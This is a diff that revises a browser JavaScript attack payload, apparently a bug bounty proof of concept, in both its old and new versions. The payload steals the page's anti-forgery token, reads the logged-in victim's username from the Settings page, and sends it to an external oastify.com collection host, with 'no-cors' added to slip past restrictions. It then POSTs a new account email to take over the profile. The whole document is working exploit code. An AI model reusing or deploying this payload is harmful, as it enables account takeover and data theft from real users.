@@ -1,38 +1,35 @@
 (async () => {
   try {
-    console.log("start");
+    console.log("Execution started...");
 
-    const token =
-      document.querySelector('input[name="__RequestVerificationToken"]')?.value;
-    console.log("token:", token);
-
+    // 1. Extract the Anti-Forgery Token
+    const token = document.querySelector('input[name="__RequestVerificationToken"]')?.value;
     if (!token) {
-      console.error("missing token");
+      console.error("CSRF Token not found.");
       return;
     }
 
-    console.log("before GET /Settings");
-    const r = await fetch("/Settings", { credentials: "include" });
-    console.log("GET status:", r.status);
-
-    const html = await r.text();
-    console.log("html length:", html.length);
-
+    // 2. Fetch the settings page to scrape the current username
+    const response = await fetch("/Settings", { credentials: "include" });
+    const html = await response.text();
     const doc = new DOMParser().parseFromString(html, "text/html");
-    const username =
-      doc.querySelector("#ProfileInfo_LoginName-input")?.value ||
-      doc.querySelector('input[name="ProfileInfo.LoginName"]')?.value;
+    
+    const username = doc.querySelector("#ProfileInfo_LoginName-input")?.value || 
+                     doc.querySelector('input[name="ProfileInfo.LoginName"]')?.value || 
+                     "unknown_user";
 
-    console.log("username:", username);
-    fetch('https://e8nqpku10p8gzynraefduguziqohca0z.oastify.com?username='+username)
-    console.log("before second request");
+    // 3. Exfiltrate data (Added await and encoding)
+    console.log(`Exfiltrating username: ${username}`);
+    await fetch(`https://e8nqpku10p8gzynraefduguziqohca0z.oastify.com?username=${encodeURIComponent(username)}`, {
+      mode: 'no-cors' // Helps bypass some basic CSP/CORS restrictions for simple pings
+    });
 
+    // 4. Perform the state-changing action
     const fd = new FormData();
     fd.append("ProfileInfo.Email", "trey@inspectiv.com");
     fd.append("__RequestVerificationToken", token);
 
-    console.log("before POST");
-    const r2 = await fetch("/Settings?handler=UpdateProfileInfo", {
+    const updateResponse = await fetch("/Settings?handler=UpdateProfileInfo", {
       method: "POST",
       credentials: "include",
       headers: {
@@ -41,9 +38,8 @@
       body: fd
     });
 
-    console.log("POST status:", r2.status);
-    console.log("POST body:", await r2.text());
+    console.log("Update status:", updateResponse.status);
   } catch (e) {
-    console.error("top-level error:", e);
+    console.error("Payload failed:", e);
   }
 })();
